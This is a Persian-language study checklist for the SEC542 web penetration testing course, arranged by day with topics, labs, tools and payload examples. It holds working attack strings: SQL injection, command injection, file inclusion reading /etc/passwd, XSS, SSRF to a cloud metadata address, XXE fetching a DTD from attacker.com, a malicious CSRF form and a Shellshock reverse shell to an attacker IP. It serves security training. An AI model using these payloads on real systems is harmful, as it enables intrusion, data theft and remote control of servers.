# SEC 542

# 📘 چک‌لیست جامع SEC542 – تست نفوذ وب و هک اخلاقی

## 🗓 روز اول: مقدمه و جمع‌آوری اطلاعات (Recon)

### مباحث کلیدی:
- آشنایی با متدولوژی OWASP
- پروتکل‌های HTTP/HTTPS
- ابزارهای پروکسی مانند Burp Suite و ZAP
- جمع‌آوری اطلاعات با ابزارهایی مانند WHOIS و DNS

### آزمایشگاه‌ها:
- تحلیل تنظیمات SSL
- پروفایل‌سازی هدف
- کشف محتوا با ابزارهایی مانند `dirb` و `gobuster`

### پیلودها و پارامترهای رایج:
- پارامترهای ورودی: `id`, `user`, `order`
- پیلودهای SQL Injection:
  - `' OR '1'='1 --`
  - `1 UNION SELECT null,@@version--`
  - `1' AND SLEEP(5)--`

---

## 🗓 روز دوم: پیکربندی، هویت و تست احراز هویت

### مباحث کلیدی:
- اسکن با ابزارهایی مانند Nmap
- تست پیکربندی نرم‌افزار
- آسیب‌پذیری Shellshock
- بررسی احراز هویت و مدیریت نشست

### آزمایشگاه‌ها:
- جمع‌آوری اطلاعات سرور
- تست Shellshock
- اسپایدرینگ وب‌اپلیکیشن‌ها
- بررسی اطلاعات نشت‌یافته

### پیلودها و پارامترهای رایج:
- Shellshock:
  - `() { :;}; echo; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
- تست احراز هویت:
  - `admin:password`
  - `user:1234`

---

## 🗓 روز سوم: تزریق‌ها (Injection)

### مباحث کلیدی:
- تزریق SQL (Error-based, Union-based, Blind)
- تزریق فرمان (Command Injection)
- گنجاندن فایل‌ها (File Inclusion)

### آزمایشگاه‌ها:
- تست تزریق SQL با ابزارهایی مانند `sqlmap`
- تست تزریق فرمان
- تست گنجاندن فایل‌ها

### پیلودها و پارامترهای رایج:
- SQL Injection:
  - `' OR '1'='1 --`
  - `1 UNION SELECT null,@@version--`
- Command Injection:
  - `127.0.0.1; whoami`
  - `127.0.0.1 && id`
- File Inclusion:
  - `../../../../etc/passwd`
  - `php://filter/convert.base64-encode/resource=index.php`

---

## 🗓 روز چهارم: XSS، SSRF و XXE

### مباحث کلیدی:
- انواع XSS (Reflected, Stored, DOM-based)
- SSRF (Server-Side Request Forgery)
- XXE (XML External Entity)

### آزمایشگاه‌ها:
- تست XSS با Burp Suite
- تست SSRF
- تست XXE

### پیلودها و پارامترهای رایج:
- XSS:
  - `<script>alert(1)</script>`
  - `"><img src=x onerror=alert(1)>`
- SSRF:
  - `http://127.0.0.1:22`
  - `http://169.254.169.254/latest/meta-data/`
- XXE:
  - `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
  - `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd"> ]>`

---

## 🗓 روز پنجم: CSRF، اشتباهات منطقی و ابزارهای پیشرفته

### مباحث کلیدی:
- CSRF (Cross-Site Request Forgery)
- اشتباهات منطقی در برنامه‌ها
- ابزارهای پیشرفته مانند Nuclei و BeEF

### آزمایشگاه‌ها:
- تست CSRF
- شبیه‌سازی اشتباهات منطقی
- استفاده از Nuclei برای اسکن آسیب‌پذیری‌ها
- استفاده از BeEF برای حملات XSS

### پیلودها و پارامترهای رایج:
- CSRF:
  - فرم مخرب:
    ```html
    <form action="https://target.com/api/v1/settings/email" method="POST">
      <input type="hidden" name="email" value="attacker@mail.com">
      <input type="submit">
    </form>
    ```
- اشتباهات منطقی:
  - تغییر پارامتر `role` در JWT:
    - `{"role": "admin"}`
  - تغییر پارامتر `id` در URL:
    - `/api/v1/users?id=999`

---

## 🗓 روز ششم: Capture the Flag (CTF)

### فعالیت‌ها:
- تقسیم به تیم‌ها
- حل چالش‌های عملی در زمینه تست نفوذ وب
- استفاده از تمامی مهارت‌های آموخته‌شده در دوره

---

## 🛠 ابزارهای پیشنهادی:

- **Burp Suite Pro**: برای تست آسیب‌پذیری‌های وب
- **OWASP ZAP**: جایگزین رایگان Burp Suite
- **sqlmap**: برای تست تزریق SQL
- **ffuf**: برای fuzzing ورودی‌ها
- **gobuster**: برای کشف دایرکتوری‌ها و فایل‌ها
- **BeEF**: برای حملات XSS و کنترل مرورگر قربانی
- **Nuclei**: برای اسکن آسیب‌پذیری‌ها با الگوهای قابل تنظیم

---

## 📌 نکات مهم:

- همیشه پس از استفاده از ابزارهای اسکن خودکار، نتایج را به صورت دستی بررسی کنید تا از صحت آن‌ها اطمینان حاصل کنید.
- در تست‌های XSS، از ابزارهایی مانند Burp Suite برای شبیه‌سازی حملات و مشاهده رفتار برنامه استفاده کنید.
- در تست‌های CSRF، اطمینان حاصل کنید که برنامه از توکن‌های CSRF برای جلوگیری از این نوع حملات استفاده می‌کند.
- در تست‌های SSRF، به دنبال ورودی‌هایی باشید که می‌توانند درخواست‌های HTTP به سرورهای داخلی ارسال کنند.
